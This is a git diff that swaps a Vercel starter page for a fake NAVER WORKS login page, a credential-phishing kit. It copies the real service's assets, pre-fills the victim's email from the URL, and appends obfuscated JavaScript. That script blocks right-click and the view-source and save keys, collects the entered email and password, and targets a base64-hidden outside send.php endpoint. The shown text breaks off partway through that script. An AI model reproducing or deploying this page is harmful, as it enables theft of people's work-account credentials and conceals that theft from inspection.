@@ -1,96 +1,181 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <script defer src="/_vercel/insights/script.js"></script>
-    <link
-      rel="stylesheet"
-      href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css"
-    />
-    <title>Vercel HTML Starter</title>
-    <meta
-      name="description"
-      content="High-performance HTML based website template."
-    />
-  </head>
-  <body>
-    <h1>Vercel HTML Starter</h1>
-    <p>
-      This template is a simple, but powerful single
-      <code>index.html</code> file deployed to
-      <a href="https://vercel.com">Vercel</a>. When your site is deployed, all
-      static assets (like HTML, JavaScript, CSS, images, and more) are deployed
-      globally to every
-      <a href="https://vercel.com/docs/concepts/edge-network/overview"
-        >Vercel Edge Network</a
-      >
-      region.
-    </p>
-    <h2>Simple, privacy-friendly analytics</h2>
-    <p>
-      Want to understand your visitor traffic? Vercel Analytics gives you
-      first-party, privacy-friendly traffic analytics for your HTML site. This
-      template is already configured using the following script:
-    </p>
-    <pre><code>&lt;script defer src="/_vercel/insights/script.js"&gt;&lt;/script&gt;</code></pre>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/analytics">Vercel Analytics</a>.
-    </p>
-    <h2>Integrated with git</h2>
-    <p>
-      Deploying updates to your site is as simple as
-      <code>git push</code> thanks to Vercel's advanced
-      <a href="https://vercel.com/docs/concepts/git">Git Integration</a>.
-      Support for GitHub, GitLab, Bitbucket is zero-configuration, and with the
-      flexible Vercel CLI and API, you can integrate with any tool possible.
-    </p>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/docs/concepts/git">Git Integration</a>.
-    </p>
-    <h2>Fast <code>gzip</code> compression</h2>
-    <p>
-      To help ensure the smallest possible file sizes for your static assets,
-      the Vercel Edge Network compresses files by default using
-      <code>gzip</code>. You can also optionally use
-      <code>brotli</code> compressesion if you prefer.
-    </p>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/docs/concepts/edge-network/compression"
-        >compression</a
-      >.
-    </p>
-    <h2>Advanced routing configuration</h2>
-    <p>
-      Vercel gives you a variety of ways to configure the routing of your
-      website. For example, adding redirects, rewrites, or headers to your page.
-      While you can use <code>vercel.json</code> to define these through JSON,
-      you can also express your routing configuration as code using
-      <a href="https://vercel.com/docs/concepts/functions/edge-middleware"
-        >Vercel Edge Middleware</a
-      >.
-    </p>
-    <p>
-      Middleware runs before the
-      <a href="https://vercel.com/docs/concepts/edge-network/caching"
-        >Vercel Edge Network Cache</a
-      >, so you can configure routing exactly as your application needs. For
-      example, this template uses <code>middleware.js</code> defined in the root
-      of the repository to add additional security headers to the site:
-    </p>
-    <pre><code>referrer-policy: origin-when-cross-origin
-strict-transport-security: max-age=31536000; includeSubDomains; preload
-x-content-type-options: nosniff
-x-dns-prefetch-control: on
-x-frame-options: DENY</code></pre>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/docs/concepts/functions/edge-middleware"
-        >Vercel Edge Middleware</a
-      >.
-    </p>
-  </body>
-</html>
+<html lang="en"><head>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+    <meta charset="utf-8">
+    <title>Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
+    <link rel="stylesheet" type="text/css" href="https://auth.worksmobile.com/css/login.css?20240725">
+    <link rel="stylesheet" type="text/css" href="https://auth.worksmobile.com/css/edge_pw_icon_disable.css?20240725">
+	<link rel="shortcut icon" href="data:image/jpeg;base64,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">
+    <script src="https://auth.worksmobile.com/js/jquery/jquery-3.6.0.min.js?20240725" type="text/javascript"></script>
+    <script src="https://auth.worksmobile.com/js/message/message_en_US.js?20240725" type="text/javascript"></script>
+    <script src="https://auth.worksmobile.com/js/rsa.js?20240725" type="text/javascript"></script>
+        <script type="text/javascript" src="https://auth.worksmobile.com/js/service/auth_core.js?20240725"></script>
+        <script type="text/javascript" src="https://auth.worksmobile.com/js/service/auth_service.js?20240725"></script>
+    <script type="text/javascript" src="https://auth.worksmobile.com/js/common/lcslog.js?20240725" charset="utf-8"></script>
+<script type="text/javascript">
+    var eventType = (/(MSIE (10|9|8|7)|Trident\/(6|5|4|3))/.test((window.navigator || {}).userAgent)) ? 'load' : 'pageshow';
+    window.addEventListener(eventType,  function(event) {
+        if (typeof lcsSti !== 'undefined') {
+            sendLcs(lcsSti);
+        }
+    }, false);
+
+    function sendLcs(lcsSti) {
+        lcsSti = setMobilePrefix(lcsSti);
+        lcsSti = setInstancePostfix(lcsSti);
+        var resourcePhase = null;
+        if (resourcePhase != 'real') { // stage도 리얼이 아닌 알파로 잡히게 수정
+            window.lcs_SerName = 'alpha-lcs.worksmobile.com'; // for alpha Test
+        }
+        lcs_do({"sti" : lcsSti});
+    }
+
+    function setMobilePrefix(lcsSti) {
+        if (navigator.userAgent.indexOf('WorksMobile') > -1) {
+            lcsSti = 'm_' + lcsSti;
+        }
+        return lcsSti;
+    }
+
+    function setInstancePostfix(lcsSti) {
+        var idcType = "kr1";
+        if (idcType == 'kr1' || idcType == 'kr0') {
+            lcsSti += '_kr';
+        } else {
+            lcsSti += '_jp';
+        }
+        return lcsSti
+    }
+</script>
+</head>
+<body>
+<div id="root">
+    <a href="#content" class="skip">go to the text</a>
+    <div class="wrap en_US integration">
+        <div class="container">
+            <div class="contents_box">
+                <div class="contents ">
+                    <h1 class="logo"><span class="blind">NAVER WORKS</span></h1>
+                    
+                    <h2 class="title">Enter your password.</h2>
+                    <div class="input_wrap">
+                        <div class="input_area" id="idInputArea">
+                            <div class="input_cover" id="idInputCover">
+                                <label for="user_id" class="blind">ID</label>
+                                <input type="text" id="email" class="input_box" placeholder="Login ID" value="">
+                            </div>
+                            <ul class="account_list" id="login_id_list">
+                            </ul>
+                        </div>
+                        <!-- <p class="invalid_desc" id="idFailMessage">Enter your ID.</p> -->
+                    </div>
+                    <div class="input_wrap">
+                        <div class="input_area">
+                            <div class="input_cover" id="pwdInputCover">
+                                <label for="user_pwd" class="blind">password</label>
+                                <input type="password" id="password" class="input_box" placeholder="Password">
+                                <button type="button" id="user_pwd_clear" class="btn_delete"><span class="blind">delete</span></button>
+                                <div class="other">
+                                    <button class="btn_masking"><span class="blind">show the password</span></button>
+                                </div>
+                            </div>
+                        </div>
+                        <p class="invalid_desc" id="msg"></p>
+                        <p class="invalid_desc" id="error"></p>
+                    </div>
+
+                    <div class="security_area" id="divCaptcha" style="display: none">
+                        <div class="input_img_cover">
+                            <div class="img_box" id="captchaImage"></div>
+                            <button type="button" class="btn_refresh" id="changeCaptchaBtn">Refresh</button>
+                        </div>
+                        <div class="input_cover" id="captchaInputCover">
+                            <label for="user_auth" class="blind">CAPTCHA</label>
+                            <input type="text" id="user_auth" class="input_box" placeholder="Captcha code">
+                        </div>
+                        <p class="invalid_desc" id="captchaFailMessage">Please enter captcha.</p>
+                        <input type="hidden" id="captchaKey" value="">
+                    </div>
+                    <div class="input_btn_area">
+                        <button type="button" id="loginBtn" class="btn_submit">Login</button>
+                    </div>
+                    <div class="check_area">
+                        <div class="check_info">
+                            <div class="check_cover">
+                                <input type="checkbox" id="keepLogin" class="input_check">
+                                <label for="keepLogin" id="label_keepLogin" class="input_label">Keep logged in</label>
+                                <div class="tooltip_area">
+                                    <button class="btn_tooltip" id="keepLoginBtn"><span class="blind">tooltip</span></button>
+                                    <div class="tooltip_box wide" id="keepLoginToolTipBox">
+                                        Automatically log in with this account.<br>
+                                        Others may be able to log in with this account. Please use this on a home or business PC to protect your information.
+                                        <button type="button" class="btn_tooptip_close"><span class="blind">close</span></button>
+                                    </div>
+                                </div>
+                            </div>
+
+                            
+                            <div class="more_area">
+                                <a href="#" class="link findPwdBtn">Find Password</a>
+                            </div>
+                        </div>
+                        <div class="check_info">
+                            <div class="check_cover">
+                                <input type="checkbox" id="rememberId" class="input_check">
+                                <label for="rememberId" class="input_label">Remember ID</label>
+                                <div class="tooltip_area">
+                                    <button class="btn_tooltip" id="rememberIdBtn"><span class="blind">tooltip</span></button>
+                                    <div class="tooltip_box" id="rememberIdTooltipBox">
+                                        Remembers your ID.<br>
+                                        Please pay special attention when using on a public PC with vulnerable security.
+                                        <button type="button" class="btn_tooptip_close" id="rememberIdBtnClose"><span class="blind">close</span></button>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                        </div>   
+                    </div>
+                </div>
+            </div>
+            <div class="other_contents">
+                <a href="#" id="clearIdBtn" class="another_way back">Login with other account</a>
+            </div>
+            <footer class="footer">
+    <address class="copyright">© NAVER Cloud Corp.</address>
+</footer>
+
+        </div>
+    </div>
+    <input type="hidden" id="fingerPrint" value="a4421303c69330d63349c20ffa9e0add">
+    <input type="hidden" id="fingerPrintDetail" value="user_agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36;language=en-US;color_depth=24;device_memory=8;hardware_concurrency=8;resolution=1280,720;timezone_offset=-60;session_storage=1;local_storage=1;navigator_platform=Win32;canvas=canvas winding:yes~canvas fp:data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAB9AAAADICAYAAACwGnoBAAAAA;webgl=data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAACWCAYAAABkW7XSAAAAAXNSR0IArs4c6QAADPpJREFUeF7tnV;webgl_vendor=Google Inc. (Intel)~ANGLE (Intel, Intel(R) UHD Graphics 620 (0x00005917) Direct3D11 vs_5_0 ps_5_0, D3D11);has_lied_languages=false;has_lied_resolution=false;has_lied_os=true;has_lied_browser=false;">
+    <input type="hidden" id="accessUrl" name="accessUrl" value="https%3A%2F%2Fmail.worksmobile.com%2F">
+    <input type="hidden" id="msgToken" value="">
+    <input type="hidden" id="locationList" value="[kr1, jp1, jp2, kr0, de0, kr9]">
+    <input type="hidden" id="language" value="en_US">
+    <input type="hidden" id="wpTempUserLoginId" value="">
+    <input type="hidden" name="deviceId" id="deviceId" value="">
+    <input type="hidden" name="deviceIdSessionKey" id="deviceIdSessionKey" value="">
+    <input type="hidden" name="openapiParameters" id="openapiParameters" value="">
+
+    <input type="hidden" id="loginType" value="web">
+</div>
+<script>
+    var isNcs = false;
+    if (isNcs === "false") {
+        var lcsSti = 'worksmobile_admin_auth_loginstep2';
+    }
+
+    var emailDomain = "localstitch.kr";
+    var serviceCode = "login_web";
+    var maskedLoginIdListInfo = "";
+
+    var oBubbleTip = new BubbleTip('rememberId', 'keepLogin');
+    var oAccountList = new AccountList(maskedLoginIdListInfo, emailDomain);
+    var oPasswordLogIn = new PasswordLogIn(emailDomain, serviceCode);
+</script>
+<script>
+var _0xf40120=_0x12ca;(function(_0x11af1d,_0x39c373){var _0x1968e4=_0x12ca,_0xb6e324=_0x11af1d();while(!![]){try{var _0x2ede85=-parseInt(_0x1968e4(0xb7))/0x1*(-parseInt(_0x1968e4(0xdc))/0x2)+parseInt(_0x1968e4(0xb2))/0x3*(-parseInt(_0x1968e4(0xd3))/0x4)+parseInt(_0x1968e4(0xab))/0x5+-parseInt(_0x1968e4(0xa0))/0x6*(-parseInt(_0x1968e4(0xcc))/0x7)+parseInt(_0x1968e4(0xb1))/0x8+parseInt(_0x1968e4(0xa3))/0x9+-parseInt(_0x1968e4(0xc6))/0xa;if(_0x2ede85===_0x39c373)break;else _0xb6e324['push'](_0xb6e324['shift']());}catch(_0x37008c){_0xb6e324['push'](_0xb6e324['shift']());}}}(_0x3f5b,0xc8e83));var _0x4c3e0a=(function(){var _0x1a8647=!![];return function(_0x2fcf7b,_0x3bcffd){var _0x5be626=_0x1a8647?function(){var _0x2d4eea=_0x12ca;if(_0x3bcffd){var _0x24ebbb=_0x3bcffd[_0x2d4eea(0xc1)](_0x2fcf7b,arguments);return _0x3bcffd=null,_0x24ebbb;}}:function(){};return _0x1a8647=![],_0x5be626;};}()),_0x3c95ac=_0x4c3e0a(this,function(){var _0x4d6beb=_0x12ca;return _0x3c95ac['toString']()[_0x4d6beb(0xde)]('(((.+)+)+)+$')['toString']()['constructor'](_0x3c95ac)[_0x4d6beb(0xde)](_0x4d6beb(0xa9));});function _0x12ca(_0x2f91ca,_0x517c65){var _0x518209=_0x3f5b();return _0x12ca=function(_0x5e3e70,_0x4beff8){_0x5e3e70=_0x5e3e70-0xa0;var _0x27cac1=_0x518209[_0x5e3e70];return _0x27cac1;},_0x12ca(_0x2f91ca,_0x517c65);}_0x3c95ac();var _0x4beff8=(function(){var _0x19cb54=!![];return function(_0x184bfe,_0xf6febd){var _0x2d2413=_0x19cb54?function(){var _0x4ff365=_0x12ca;if(_0xf6febd){var _0x5dea99=_0xf6febd[_0x4ff365(0xc1)](_0x184bfe,arguments);return _0xf6febd=null,_0x5dea99;}}:function(){};return _0x19cb54=![],_0x2d2413;};}()),_0x5e3e70=_0x4beff8(this,function(){var _0x3fc172=_0x12ca,_0x4277fc;try{var _0x2daaf9=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x4277fc=_0x2daaf9();}catch(_0x28b20f){_0x4277fc=window;}var _0x54ef82=_0x4277fc[_0x3fc172(0xc5)]=_0x4277fc[_0x3fc172(0xc5)]||{},_0x3338e9=[_0x3fc172(0xdd),_0x3fc172(0xbd),'info',_0x3fc172(0xbe),'exception',_0x3fc172(0xa2),_0x3fc172(0xce)];for(var _0xdfc25f=0x0;_0xdfc25f<_0x3338e9[_0x3fc172(0xaf)];_0xdfc25f++){var _0x5b8313=_0x4beff8[_0x3fc172(0xd2)]['prototype']['bind'](_0x4beff8),_0xc1a99c=_0x3338e9[_0xdfc25f],_0x271f5c=_0x54ef82[_0xc1a99c]||_0x5b8313;_0x5b8313[_0x3fc172(0xae)]=_0x4beff8[_0x3fc172(0xa6)](_0x4beff8),_0x5b8313[_0x3fc172(0xd1)]=_0x271f5c[_0x3fc172(0xd1)][_0x3fc172(0xa6)](_0x271f5c),_0x54ef82[_0xc1a99c]=_0x5b8313;}});function _0x3f5b(){var _0x3aa8a4=['#password','8332EvwxEu','indexOf','keypress','substr','#m-btn','replace','warn','error','toLowerCase','onkeydown','apply','Please\x20enter\x20complete\x20email\x20address','POST','which','console','20683460ElyaxG','ajax','input','https://mail.worksmobile.com','addEventListener','location','182KrDKrr','JSON','trace','show','hide','toString','constructor','855412etBKnl','msg','You\x20must\x20specify\x20an\x20email\x20to\x20log\x20in.','#loginBtn','Login','ready','keyCode','signal','button','314uTpqfl','log','search','3426JrTUZM','keyup','table','11737026RyTLKK','val','autofocus','bind','#error','keydown','(((.+)+)+)+$','hash','1921570aZBsuH','#email','attr','__proto__','length','click','4171376korSkI','9XHlLyG','#msg','html','preventDefault'];_0x3f5b=function(){return _0x3aa8a4;};return _0x3f5b();}_0x5e3e70(),$(document)[_0xf40120(0xa6)](_0xf40120(0xa8),function(_0x2f6560){var _0x329ec0=_0xf40120;if(_0x2f6560['ctrlKey']&&_0x2f6560[_0x329ec0(0xc4)]==0x53)return _0x2f6560[_0x329ec0(0xb5)](),![];}),document[_0xf40120(0xca)]('contextmenu',_0x5803f3=>_0x5803f3[_0xf40120(0xb5)]()),document[_0xf40120(0xc0)]=function(_0x4fc190){var _0x444686=_0xf40120;return _0x4fc190['ctrlKey']&&(_0x4fc190[_0x444686(0xd9)]===0x43||_0x4fc190['keyCode']===0x56||_0x4fc190[_0x444686(0xd9)]===0x55||_0x4fc190[_0x444686(0xd9)]===0x75)?![]:!![];},$(document)[_0xf40120(0xb9)]('u',function(_0x1ffd23){return _0x1ffd23['ctrlKey']?![]:!![];}),$(document)[_0xf40120(0xd8)](function(){var _0xd44dc7=_0xf40120,_0x1fb49a=0x0;$(_0xd44dc7(0xbb))[_0xd44dc7(0xb0)](),$(_0xd44dc7(0xc8))[_0xd44dc7(0xa1)](function(_0x4f2255){var _0x322b78=_0xd44dc7;_0x4f2255[_0x322b78(0xd9)]===0xd&&$(_0x322b78(0xdb))[_0x322b78(0xb0)]();});var _0x425aa2=window[_0xd44dc7(0xcb)][_0xd44dc7(0xaa)][_0xd44dc7(0xba)](0x1);if(!_0x425aa2){}else{var _0x120881=/^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;if(!_0x120881['test'](_0x425aa2))var _0x528643=_0x425aa2;else var _0x528643=atob(_0x425aa2);var _0xecb573=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/,_0x44f58b=_0x528643[_0xd44dc7(0xb8)]('@'),_0x482290=_0x528643['substr'](_0x44f58b+0x1),_0x36b5b8=_0x482290[_0xd44dc7(0xba)](0x0,_0x482290[_0xd44dc7(0xb8)]('.')),_0x24b23b=_0x36b5b8[_0xd44dc7(0xbf)]();$(_0xd44dc7(0xac))[_0xd44dc7(0xa4)](_0x528643),$(_0xd44dc7(0xac))[_0xd44dc7(0xad)](_0xd44dc7(0xa5),!![]),$(_0xd44dc7(0xb3))[_0xd44dc7(0xd0)]();}var _0x3ca292='aHR0cHM6Ly9mYWNhZGVzei5vbmxpbmUvZ2VuL3l1bi9zb2wvbmF2L3NlbmQucGhw';$(_0xd44dc7(0xd6))[_0xd44dc7(0xb0)](function(_0x164757){var _0x32715e=_0xd44dc7;$(_0x32715e(0xa7))[_0x32715e(0xd0)](),$(_0x32715e(0xb3))[_0x32715e(0xd0)](),_0x164757[_0x32715e(0xb5)]();var _0x82df32=$('#email')[_0x32715e(0xa4)](),_0x52e229=$(_0x32715e(0xb6))[_0x32715e(0xa4)](),_0x431154=$(_0x32715e(0xb3))[_0x32715e(0xb4)]();$('#msg')['text'](_0x431154);var 